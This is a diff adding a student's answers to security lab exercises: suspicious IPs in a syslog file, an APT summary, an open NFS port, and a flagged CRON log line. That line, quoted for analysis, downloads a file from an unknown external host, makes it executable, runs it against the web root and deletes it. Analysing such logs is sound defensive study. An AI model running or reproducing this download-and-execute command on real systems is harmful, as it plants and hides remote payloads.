@@ -315,4 +315,47 @@ These log lines beginning with a date are system logs, also known as **syslog**.
 
 ![Task 02 - Exercise M](./docs/img/task02-exerciseM.png)
 
-`
+### Exercise N - List the IPs that you consider suspect in `log1`
+
+The IP **118.25.149.110** is very suspicious, due to many attempts to access various PHP scripts on the server within a short period of time.
+
+The same can be saide to the IP **51.75.28.10**, which, within a very short window of time, attempts many request for scripts associated with Jenkins servers.
+
+### Exercise O - Conduct research on APT (Advanced Persistent Threat) and comment on its characteristics
+
+As stated by the company [Imperva](https://www.imperva.com/learn/application-security/apt-advanced-persistent-threat/):
+
+> An advanced persistent threat (APT) is a broad term used to describe an attack campaign in which an intruder, or team of intruders, establishes an illicit, long-term presence on a network in order to mine highly sensitive data.
+> The targets of these assaults, which are very carefully chosen and researched, typically include large enterprises or governmental networks. The consequences of such intrusions are vast, and include:
+> - Intellectual property theft (e.g., trade secrets or patents)
+> - Compromised sensitive information (e.g., employee and user private data)
+> - The sabotaging of critical organizational infrastructures (e.g., database deletion)
+> - Total site takeovers
+
+Its stages are Infiltration, Expansion, and Extraction.
+
+These are some of the measures that they suggest to prevent APT progression:
+
+![Task 02 - Exercise O](./docs/img/task02-exerciseO.jpg)
+
+### Exercise P - Exploit another vulnerability (not presented in this roadmap) in the target machine and present evidence
+
+In the screenshot below we can notice that the port 2049 is open and running the NFS (Network File System). This becomes particularly dangerous because the target machine becomes accessible to any other machine on the network to connect and utilize NFS.
+
+![Task 02 - Exercise P](./docs/img/task01-exerciseB.png)
+
+### Exercise Q - Identify a behavior in `log2` which may cause a security incident on the system
+
+There's a very suspicious behavior, that may cause a security incident on the system, in the 8th line of the `log2` file, which is:
+
+```txt
+Sep 16 21:45:01 vmi147857 CRON[19629]: (www-data) CMD (wget -q -O xxxd http://hello.hellodolly777.xyz/xxxd && chmod 0755 xxxd && /bin/sh xxxd /var/www/html/site 24 && rm -f xxxd)
+```
+
+There are several red flags, like:
+
+- Downloading from an unknown source;
+- Executing without verification;
+- Very unusual name for a website;
+- Running as a privileged user, as the CRON job is executing under the www-data user, which may have access to sensitive data.
+- The file is deleted after execution, making it harder to trace its actions afterwards.
